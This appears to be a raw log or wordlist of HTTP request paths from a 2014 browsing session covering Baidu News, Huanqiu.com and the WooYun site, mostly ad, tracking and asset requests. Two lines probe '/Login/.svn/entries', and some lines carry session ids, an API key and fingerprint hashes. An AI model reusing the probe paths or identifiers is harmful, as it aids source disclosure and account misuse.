+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.6292392662726343
+/u.gif?ts=69u&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&xp=A6(b)AA2AAAC2&g=focustop-carousel&ep=.622,.622&ci=3&pp=1415,365&ps=1920,8316&u=none&txt=none
+/c.gif?t=5&p=2&q=&ra=0.2664930399041623
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=[{x:455,y:365,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=276499386&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/pc/misc/connect/configs/qqface_configs_v2.json
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/download/14705/
+/Login/self_information
+/360ap/360apexe_ffb1c2a0954546ea607f25ca8a049fa6_5.1.0.1050.cab
+/360ap/360apexe_ffb1c2a0954546ea607f25ca8a049fa6_5.1.0.1050.cab
+/
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.31.91
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.235.201
+/KsafeSpeedTest/ksafe/queryip.d?ip=192.0.80.241
+/KsafeSpeedTest/ksafe/queryip.d?ip=173.194.33.110
+/themes/wooyun/css/style.css
+/source/js/jquery.js
+/themes/wooyun/images/logo.png
+/upload/avatar/avatar_4166.jpg
+/upload/avatar/avatar_203.jpg
+/upload/avatar/avatar_5517.jpg
+/upload/avatar/avatar_1011.jpg
+/upload/avatar/avatar_786.jpg
+/upload/avatar/avatar_626.jpg
+/upload/avatar/avatar_4.jpg
+/themes/wooyun/images/v-15.png
+/upload/avatar/avatar_50.jpg
+/upload/avatar/avatar_5571.jpg
+/upload/avatar/avatar_1585.jpg
+/upload/avatar/avatar_1146.jpg
+/themes/wooyun/images/wb.png
+/upload/avatar/avatar_2290.jpg
+/upload/avatar/avatar_29.gif
+/upload/avatar/avatar_501.jpg
+/themes/wooyun/images/credit.png
+/upload/avatar/avatar_627.jpg
+/upload/avatar/avatar_50_50.png
+/upload/avatar/avatar_4451_s.jpg
+/upload/avatar/avatar_30_30.png
+/upload/avatar/avatar_5683_s.jpg
+/upload/avatar/avatar_1689_s.gif
+/h.js?3faf3a47435cc512f3b86dc12af100d0
+/themes/wooyun/images/bg.png
+/themes/wooyun/images/navBg.png
+/themes/wooyun/images/search.png
+/themes/wooyun/images/liBg.gif
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.03240403579548001
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.03240403579548001
+/u.gif?ts=7im&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&xp=A6(b)AA2AAAC2&g=focustop-carousel&ep=.622,.622&ci=4&pp=1415,365&ps=1920,8316&u=none&txt=none
+/c.gif?t=5&p=2&q=&ra=0.26544224261306226
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=[{x:455,y:365,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=668943589&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1366x768&et=0&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221878&nv=1&rnd=156156675&si=3faf3a47435cc512f3b86dc12af100d0&st=1&v=1.0.70&lv=3&tt=WooYun(白帽子技术社区) -- 网络安全资讯、讨论，跨站师，渗透师，结界师聚集之地又一个有意思的地方
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/poll?r=0.31188337619902795&u=332746458&s=7&k=Q7UBWSdG2k7VEzir&t=0&i=30&r=0.28917202442157086
+/Login/userpage
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/Login
+/poll?r=0.3667409985791892&u=815922797&s=7&k=nqyEMXtnbf6hMD8p&t=0&i=30&r=0.13907444686628878
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/v.gif?pid=107&url=http://world.huanqiu.com/photo/2014-11/2754043.html&type=0&m=11&c=top&a=12&col=4&pn=5&t=&ra=0.9564292763825506
+/v.gif?pid=107&url=http://world.huanqiu.com/photo/2014-11/2754043.html&type=0&m=11&c=top&a=12&col=4&pn=5&t=&ra=0.9564292763825506
+/u.gif?ts=ag5&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&xp=A6(b)AA2AAA2CR&g=focustop-carousel&ep=.625,.574&ci=5&pp=1232,397&ps=1920,8316&u=http://world.huanqiu.com/photo/2014-11/2754043.html&txt=none
+/c.gif?t=5&p=2&q=&ra=0.7170811668038368
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=[{x:272,y:397,t:a,u:http%3A%2F%2Fworld.huanqiu.com%2Fphoto%2F2014-11%2F2754043.html}]&et=2&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=1280632455&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/photo/2014-11/2754043.html
+/statics/css/public.css
+/statics/css/china/skinChina.css
+/statics/css/layouPicBigNew.css
+/cpro/ui/c.js
+/statics/hq2013/css/common/pubTopBottom.css
+/statics/js/jquery.js
+/js/m.js
+/statics/js/swfobject.js
+/rank/detail_rpph.js
+/?c=hits&a=addHits&id=2754043&catid=127
+/statics/js/topLogin.js
+/statics/js/jquery.cookie.js
+/statics/css/part.css
+/statics/css/general.css
+/statics/js/reviewRank.js
+/statics/js/HQcommon.js
+/statics/js/defaultkeyword.js
+/statics/js/picBigNew.js
+/js/commentiframe.js?aid=2754043&app=cmspic&type=cmspic
+/script/HuanQiuAllBottom.Js
+/statics/js/adCode.js
+/statics/js/tabsBox.js
+/statics/js/jquery.carouFredSel-5.6.1-packed.js
+/statics/hq2013/js/lib/jquery1.9.1.js
+/statics/js/newtopLogin.js
+/statics/hq2013/js/lib/sea.js
+/css/huanqiuTieStyles.css?&_i329c04w
+/attachment2010/2014/1129/20141129065328446.jpg
+/commentiframe.html
+/attachment2010/2014/1129/thumb_100_70_20141129064452232.jpg
+/attachment2010/2014/1129/thumb_100_80_20141129065328446.jpg
+/attachment2010/2014/1129/thumb_100_80_20141129065328557.jpg
+/attachment2010/2014/1129/thumb_100_80_20141129065328139.jpg
+/css/huanqiuTieStyles.css
+/js/jquery-1.9.1.min.js
+/js/jquery.cookie.js
+/js/huanqiuTieScripts.js
+/attachment2010/2014/1129/thumb_100_80_20141129065328537.jpg
+/attachment2010/2014/1129/thumb_100_80_20141129065328823.jpg
+/attachment2010/2014/1129/thumb_100_80_20141129065329589.jpg
+/h.js?1fc983b4c305d209e7e05d96e713939f
+/attachment2010/2014/1129/thumb_100_80_20141129065329753.jpg
+/cgi-bin/mail_spam?sid=lpQyPHJkRu_WYUcT&stat=getcopycontent&content=DFPfH00vDYOXWct9UnAwxYvJlYu2TEkx&t=getcopycontent&action=copy_link&sid=lpQyPHJkRu_WYUcT
+/statics/images/mainConBg.png
+/statics/images/loading.gif
+/statics/images/world/world.png
+/images/avatar.png
+/statics/images/btn.png
+/statics/hq2013/images/index/arrGray.png
+/statics/js/pic.swf
+/statics/hq2013/images/common/icon.png
+/images/img.png
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&et=0&fl=15.0&ja=1&ln=zh-CN&lo=0&nv=1&rnd=1299464430&si=1fc983b4c305d209e7e05d96e713939f&st=3&su=http://news.baidu.com/&v=1.0.70&lv=1&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网
+/statics/images/rightArr.png
+/statics/images/holdPic.jpg
+/statics/images/icon1.png
+/statics/images/icon.png
+/js/jquery-1.9.1.min.js
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/attachment2010/2014/1128/thumb_100_70_20141128090150428.jpg
+/ecom?di=959951&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=1&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=54x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3634&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=373&tlm=1417221910&tcn=1417221910&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/ecom?di=959952&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=2&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=1983x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3634&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=376&tlm=1417221910&tcn=1417221910&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/ecom?di=959953&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=3&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=1995x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3634&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=379&tlm=1417221910&tcn=1417221910&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/ecom?di=959755&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=4&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=1881x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3634&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=380&tlm=1417221910&tcn=1417221910&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/ecom?di=959746&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=5&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=2642x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3634&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=382&tlm=1417221910&tcn=1417221910&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/ecom?di=959623&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=6&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=2827x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3634&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=384&tlm=1417221910&tcn=1417221910&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/acom?di=u1364901&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=1&dds=&drs=1&dvi=1414464365&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=0x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3634&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=5&tlm=1417221910&tcn=1417221910&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/attachment2010/2014/1129/thumb_130_85_20141129070451808.jpg
+/attachment2010/2014/1129/thumb_130_85_20141129070434266.jpg
+/attachment2010/2014/1128/thumb_130_85_20141128014631154.jpg
+/v2/ip_query.php?key=dc76799dd2e27326bbd0d1952307d129f7a217ae44ee84bdde24bc3e2f913df5&ip=10.12.15.17&output=json&timezone=false
+/attachment2010/2014/1128/thumb_130_85_20141128091115106.jpg
+/attachment2010/2014/1128/thumb_130_85_20141128084732378.jpg
+/attachment2010/2014/1128/thumb_130_85_20141128090641873.jpg
+/painter/clb/fixed7o.js
+/attachment2010/2013/1106/thumb_130_85_20131106040126812.jpg
+/acom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=1&dis=0&ltr=http://news.baidu.com/&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=0x0&psr=1920x1080&pss=1899x3634&qn=6083034df725a6fa&rad=&rsi0=420&rsi1=350&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_12&stid=5&td_id=1364901&tn=baiduCustSTagLinkUnit&tpr=1417221910040&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=u1364901
+/ecom?di=1007910&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=7&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=3634x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3634&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=657&tlm=1417221910&tcn=1417221910&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/cmspic/002/75/40/43_1.html?callback=setDivContent&_=1417221910345
+/painter/union/inlayFixed.js
+/images/loading.gif
+/attach/go/go.jpg
+/attachment2010/2014/1128/thumb_100_65_20141128084726242.jpg
+/attachment2010/2014/1128/thumb_100_65_20141128034048783.jpg
+/attachment2010/2014/1128/thumb_100_65_20141128071304782.jpg
+/ecom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=5&dis=0&ltr=http://news.baidu.com/&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=2642x469&psr=1920x1080&pss=1899x3634&qn=aa770dce4e32aa8e&rad=&rs=301&rsi0=640&rsi1=180&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_6&stid=5&td_id=9223372032564529137&tn=baiduCustSTagLinkUnit&tpr=1417221910040&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959746
+/ecom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=6&dis=0&ltr=http://news.baidu.com/&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=2827x469&psr=1920x1080&pss=1899x3634&qn=104296a3611a2397&rad=&rs=301&rsi0=640&rsi1=60&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_3&stid=5&td_id=9223372032564536650&tn=baiduCustSTagLinkUnit&tpr=1417221910040&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959623
+/ecom?adn=4&at=6&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=4&dis=0&ltr=http://news.baidu.com/&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=1881x469&psr=1920x1080&pss=1899x3634&qn=2b65033336c909ee&rad=&rs=301&rsi0=960&rsi1=90&rsi5=4&rss0=#FFFFFF&rss1=#FFFFFF&rss2=#0000ff&rss3=#444444&rss4=#008000&rss5=&rss6=#e10900&rss7=&scale=&skin=&td_id=9223372032564549863&tn=text_default_960_90&tpr=1417221910040&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959755
+/ecom?di=959956&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=8&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=2381x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3674&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=884&tlm=1417221910&tcn=1417221911&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/ecom?di=959621&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=9&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&liu=&ltr=http://news.baidu.com/&lcr=http://news.baidu.com/&ps=3674x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3674&pis=-1x-1&cfv=15&ccd=24&chi=1&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=886&tlm=1417221910&tcn=1417221911&tpr=1417221910040&dpt=none&coa=&baidu_id=
+/attachment2010/2014/1128/thumb_100_65_20141128090641873.jpg
+/attachment2010/2014/1128/thumb_100_65_20141128020647435.jpg
+/ex?i=mm_18021420_2310348_27460204
+/js/cflash.js
+/js/flash.js
+/attachment2010/2014/1128/thumb_100_65_20141128095318916.jpg
+/attachment2010/2014/1128/thumb_100_65_20141128074849401.jpg
+/attachment2010/2014/1121/thumb_100_65_20141121102719281.jpg
+/attachment2010/2014/1128/thumb_100_65_20141128091614249.jpg
+/attachment2010/2014/1128/thumb_100_65_20141128105340313.jpg
+/painter/union/floatad.js
+/static/js/shell_v2.js?cdnversion=8
+/ex?i=mm_18021420_2310348_27472111
+/t/tanxssp.js
+/ecom?adn=1&at=6&aurl=&cad=1&ccd=24&ccw=1000&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&ct=1&dai=9&dis=0&fa=1&flw=1&ls=3&ltr=http://news.baidu.com/&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=3674x0&psr=1920x1080&pss=1899x3674&pt=1&qn=31c4d8da8f4258ab&rad=&rs=301&rsi0=120&rsi1=270&rsi5=4&rsi6=-1&rsi7=0&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=&td_id=9223372032564531746&tn=template_float_all_normal&tpr=1417221910040&ts=1&ww=0&xuanting=0&stid=2&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959621&distp=2002&adclass=1&conW=130&conH=360
+/ecom?adn=1&at=6&aurl=&cad=1&ccd=24&ccw=1000&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&ct=1&dai=9&dis=0&fa=1&flw=1&ls=3&ltr=http://news.baidu.com/&ltu=http://world.huanqiu.com/photo/2014-11/2754043.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=3674x0&psr=1920x1080&pss=1899x3674&pt=1&qn=31c4d8da8f4258ab&rad=&rs=301&rsi0=120&rsi1=270&rsi5=4&rsi6=-1&rsi7=0&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=&td_id=9223372032564531746&tn=template_float_all_normal&tpr=1417221910040&ts=1&ww=0&xuanting=0&stid=2&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959621&distp=2001&adclass=1&conW=130&conH=360
+/attachment2010/2014/1126/thumb_100_65_20141126085226786.jpg
+/attachment2010/2014/1125/thumb_100_65_20141125092432712.jpg
+/attachment2010/2014/1122/thumb_100_65_20141122030047330.jpg
+/attachment2010/2014/1127/thumb_100_65_20141127071032397.jpg
+/attachment2010/2014/1127/thumb_100_65_20141127082626323.jpg
+/statics/hq2013/allMinJs/allPageCommon/allgtTopBottom.min.js
+/attachment2010/2014/1127/thumb_100_65_20141127053142406.jpg
+/attachment2010/2014/1125/thumb_100_65_20141125100048996.jpg
+/attachment2010/2014/1123/thumb_100_65_20141123103701121.jpg
+/statics/images/articleTit.png
+/media/v1/0f0005UspZve58IP1PDp06.swf
+/c/
+/t/tanxssp/main.js
+/statics/images/sBigPicBg.png
+/attachment2010/2014/1122/thumb_100_65_20141122082725793.jpg
+/static/js/logger.js?cdnversion=393673
+/static/js/bds_s_v2.js?cdnversion=393673
+/attachment2010/2014/1124/thumb_100_65_20141124014719969.jpg
+/statics/images/logoPicBig.png
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/media/v1/0f000ajX16YWUQc6o2sFOs.swf
+/media/v1/0f000PCl-SLD8wJcufB8Kf.jpg
+/statics/images/conBgDetail.png
+/statics/images/picBigBg.png
+/statics/hq2013/images/index/index.png
+/statics/hq2013/images/index/icon.png
+/cpro/ui/noexpire/css/1.0.0/base.css
+/cpro/ui/noexpire/js/3.2.0/base.js
+/ex?i=mm_18021420_2310348_27460204&cb=jsonp_callback_56192&callback=&userid=&o=&f=&n=&re=1920x1080&r=http://news.baidu.com/&cah=1032&caw=1920&ccd=24&ctz=8&chl=1&cja=1&cpl=36&cmm=55&cf=15.0&cg=f5b31dcfa50e4230959d06e4917b4486&pvid=ed81822baac740b515a143586da65b80&ai=0&ac=5674&prp=124480770&cas=prp&cbh=3635&cbw=1899&dx=1&u=http://world.huanqiu.com/photo/2014-11/2754043.html&k=&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网
+/ex?i=mm_18021420_2310348_27472111&cb=jsonp_callback_49017&callback=&userid=&o=&f=&n=&re=1920x1080&r=http://news.baidu.com/&cah=1032&caw=1920&ccd=24&ctz=8&chl=1&cja=1&cpl=36&cmm=55&cf=15.0&cg=ab12047910be08e41b563bdbb90b9c8a&pvid=ed81822baac740b515a143586da65b80&ai=0&ac=9132&prm=124482904&cas=prm&cbh=3635&cbw=1899&dx=1&u=http://world.huanqiu.com/photo/2014-11/2754043.html&k=&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网
+/img/cpro_media_small.png
+/statics/images/leftArr.png
+/attachment2010/2014/1128/thumb_130_85_20141128091115106.jpg
+/clubapp/pop/p100000.zip
+/static/css/bdsstyle.css?cdnversion=20131219
+/clubapp/pop/p100000.zip
+/getnum?url=http://world.huanqiu.com/photo/2014-11/2754043.html&callback=bdShare.fn._getShare&type=load&t=1417221911343
+/t/acookie/acbeacon2.html
+/cpro/ui/noexpire/img/2.0.0/bd-logo5.png
+/dsp?pid=mm_18021420_2310348_27472111&bid=0a67f530000054791702789300787bb5&nid=30121174&tanxssp_t=32918
+/dsp?pid=mm_18021420_2310348_27460204&bid=0a67f52f00005479170206c1007098c0&nid=30121174&tanxssp_t=87598
+/media/v1/0f000PiqlZaAJpuAOmCID0.swf
+/Login/userpage
+/Login/.svn/entries
+/t.gif?cna=4mL8DEpqCS8CAW/M28bsOK+r&cache=517
+/Login/self_information
+/wh/o.htm?ltr=http://news.baidu.com/
+/wh/o.htm?ltr=http://news.baidu.com/&cf=u
+/Login/.svn/entries
+/static/css/index/userpage.css
+/ta.htm?sp=0,1199312,1202496,mm_18021420_2310348_27472111,0a67f530000054791702789300787bb5,9,oaeBW44YK4M=,218.75.123.171,0,0,27,,,1,300x250_65,1,world.huanqiu.com&f=0&tid=0&p=AQpn9TAAAFR5FwJ4kwB4e7UAPdgR5ZB3eg==&click=http://click.tanx.com/ct?tanx_k=173&tanx_e=auPMCC7wQbKq6y7JtFcQMv3RLKUDEF0h3G1%2frg2oH7xVAPbJ1Ty%2fLFXeVWOM13lPD%2bWyiP0UTQnRHlq5%2fgybRaX3H9h77tFFkiiXxTvR%2fMmb1kKMfZeIcZrXkb6yGEGRn2yLekYubki6Ald5PrMxthoFqtlOFNgat4gYS73KK6I%3d&tanx_u=
+/static/js/jquery-1.10.1.min.js
+/ta.htm?sp=0,1199312,1202496,mm_18021420_2310348_27460204,0a67f52f00005479170206c1007098c0,9,oaeBW44YK4M=,218.75.123.171,0,0,27,,,1,300x250_65,1,world.huanqiu.com&f=0&tid=0&p=AQpn9S8AAFR5FwIGwQBwmMD1EnASWTkgVw==&click=http://click.tanx.com/ct?tanx_k=173&tanx_e=lO%2bKTHg8kQeq6y7JtFcQMv3RLKUDEF0h3G1%2frg2oH7ysewnI72W9mt6cNr2WYAJND%2bWyiP0UTQmiNwSIWg6SF6X3H9h77tFFkiiXxTvR%2fMmb1kKMfZeIcY1cPsknYPvRn2yLekYubki6Ald5PrMxthoFqtlOFNgat4gYS73KK6I%3d&tanx_u=
+/static/image/logout_icon_2.png
+/tpl/wh.js
+/tpl/ac.js
+/Login/self_information
+/k.js
+/poll?r=0.9140278501436114&u=295448167&s=7&k=_WlsoqRcZy6cEVR9&t=0&i=30&r=0.8214768718462437
+/cmpcf.htm
+/r.js
+/hzsync.htm?sp=,,1199312,1202496,3&ext=,,,oaeBW44YK4M=&cb=747381934
+/hzsync.htm?sp=,,1199312,1202496,3&ext=,,,oaeBW44YK4M=&cb=861797291
+/swfs/d1/23826yantong12840/efd8fjd.flv
+/x.gif?k=2001457&p=6r8aC&rt=2&ns=[M_ADIP]&ni=[M_IESID]&v=[M_LOC]&o=&cb=859528036
+/x.gif?k=2001457&p=6r8aC&rt=2&ns=[M_ADIP]&ni=[M_IESID]&v=[M_LOC]&o=&cb=449268030
+/t.gif?tanx_nid=30121174&tanx_cm
+/transparent.gif
+/?dspid=10015&dspuid=5063496972576936782&gettuid=1
+/cmp.htm?vid=5063496972576936782&ver=1
+/m.gif?a=&c=860010-2370010113&mcookie=5063496972576936782
+/kb.gif?mvtype=110&ac=5063496972576936782
+/adi/55;168;21?aip4332
+/hzsync.htm?sp=,,1199312,1202496,3&ext=,,,oaeBW44YK4M=&cb=747381934
+/hzsync.htm?sp=,,1199312,1202496,3&ext=,,,oaeBW44YK4M=&cb=861797291
+/pixel/sci?pid=3038&uid=5063496972576936782&redir=http://mlt01.com/mlcp.htm?media=acxiom&ntckid=#COOKIEID#
+/creative/94336/ncfe03ke.5pf_20141127.swf
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/FrameWork/system/vi.swf
+/?tid=1008&type=1&uid=5063496972576936782
+/tbcp.htm?tanx_ver=1&tanx_tid=oaeBW44YK4M=
+/cmp.htm?media=koolbao&ntckid=1ED69D7B427B75548D6D1E4002D91603
+/mlcp.htm?media=acxiom&ntckid=3d9a4a2c-27e6-414b-831b-e1218dbd102c
+/cmpixel.htm?t=1&google_error=1
+/fp.htm?br=2&fp=66251189D1EFBF0BF61A06AF8BF9CEE3&fp2=9B7424686B42ACA97C3178CB34E05DFD&ci=477906456C00BA8324160B5DD2E7BF24:FG=1&bi=477906456C00BA8324160B5DD2E7BF24:FG=1&im=0&wf=1&ct=522&_=1417221912357
+/query?1454662
+/nova_fp.htm?br=2&fp=66251189D1EFBF0BF61A06AF8BF9CEE3&fp2=9B7424686B42ACA97C3178CB34E05DFD&ci=477906456C00BA8324160B5DD2E7BF24:FG=1&bi=477906456C00BA8324160B5DD2E7BF24:FG=1&im=0&wf=1&ct=628&_=1417221912468
+/v.gif?pid=307&type=3071&sc=624,243,1920,1032&desturl=http://world.huanqiu.com/photo/2014-11/2754043.html&apitype=1&linkid=i329c1eqepj&velo_load=492&velo_cssload=140&velo_jsLoad=355&cite_uid=&cite_type=1&cite_mini=0
